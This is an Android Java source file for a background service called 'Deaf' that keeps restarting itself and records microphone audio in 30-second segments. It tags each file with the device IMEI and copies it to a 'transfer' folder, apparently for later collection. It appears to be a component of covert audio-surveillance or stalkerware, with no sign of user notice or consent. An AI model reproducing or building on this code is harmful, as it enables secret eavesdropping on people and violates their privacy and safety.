package com.cripple;

/**
 * Created by Developer on 23.01.2018.
 */

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

import com.glob.Constants;
import com.glob.Global;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Timer;
import java.util.TimerTask;


public class Deaf extends Service {

    Timer timer = null;
    TimerTask timerTask;

    public Deaf() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }


    public void onCreate() {
        Global.printLn("Deaf","onCreate","");
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        Global.printLn("Deaf","onStartCommand", "");
        time();
        return START_STICKY;
    }

    public void onDestroy() {
        Global.printLn("Deaf","onDestroy","");
        RecAudio.stopRec();
        timer.cancel();
    }


    //----------------------------------------------------------------------------------------------
    private String genFileName(){
        Calendar c = Calendar.getInstance();
        SimpleDateFormat df3 = new SimpleDateFormat("yyyyMMddHHmmss");
        String currTime = df3.format(c.getTime());

        return "rec_"+ Runner.devImei +"_"+currTime+ ".mp4";
    }


    //----------------------------------------------------------------------------------------------
    //----------------------------------------------------------------------------------------------
    private void time() {
        timer = new Timer();
        timerTask = new TimerTask() {
            //int sec = 0;
            String fileName;

            @Override
            public void run() {
                try {
                    RecAudio.stopRec();
                    Global.copyFile(Constants.HOME.path+fileName,Constants.HOME.transfer +fileName);
                    fileName = genFileName();
                    RecAudio.startRec(Constants.HOME.path, fileName);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        };
        timer.scheduleAtFixedRate(timerTask, 1000, 30000);
    }
}
